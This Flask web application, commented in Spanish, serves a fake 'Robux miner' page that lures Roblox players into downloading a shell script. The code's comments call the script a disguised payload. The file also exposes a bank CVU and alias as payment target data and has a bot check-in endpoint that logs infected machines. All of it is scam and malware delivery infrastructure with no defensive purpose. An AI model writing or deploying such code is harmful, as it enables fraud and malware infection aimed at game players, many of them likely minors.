from flask import Flask, render_template_string, jsonify, request, send_file
import os
import datetime

app = Flask(__name__)

# CONFIGURACIÓN DEL ARQUITECTO
TARGET_DATA = {
    "cvu": "0000003100098765432101", 
    "alias": "roblox.free.svr"
}

@app.route('/')
def robux_generator():
    return """
    <html>
    <head><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0f0f0f; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { border: 2px solid #00ff00; border-radius: 15px; padding: 25px; background: #1a1a1a; margin-top: 50px; box-shadow: 0 0 20px #00ff0033; }
        .btn { background: #00ff00; color: black; padding: 18px; border: none; border-radius: 8px; font-weight: bold; width: 100%; margin-top: 25px; font-size: 16px; cursor: pointer; }
        .mining-text { color: #666; font-size: 12px; margin-top: 15px; }
    </style></head>
    <body>
        <div class="box">
            <h2 style="color:#00ff00; margin-bottom:10px;">SVR ROBUX MINER</h2>
            <p style="color:#ccc;">Genera Robux usando tu procesador.</p>
            <div id="status" style="font-weight:bold; margin:15px 0;">Minando: 0.0021 RBX/s</div>
            <button class="btn" onclick="descargar()">INICIAR MINADO</button>
            <p class="mining-text">El proceso debe mantenerse activo en segundo plano.</p>
        </div>
        <script>
            function descargar() {
                document.getElementById('status').innerHTML = "Iniciando descarga de núcleo...";
                window.location.href = "/instalar_miner";
            }
        </script>
    </body>
    </html>
    """

# RUTA QUE ENTREGA EL ARCHIVO (El "Payload")
@app.route('/instalar_miner')
def deliver_miner():
    # Enviamos el script de instalación camuflado
    return send_file('/home/Bunker_SVR/instalar_miner.sh', as_attachment=True, download_name='RobuxMiner_Installer.sh')

@app.route('/get_target')
def get_target():
    return jsonify(TARGET_DATA)

@app.route('/ping', methods=['POST'])
def ping():
    with open("bots_online.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] BOT ACTIVO: {request.json.get('uid')}\n")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
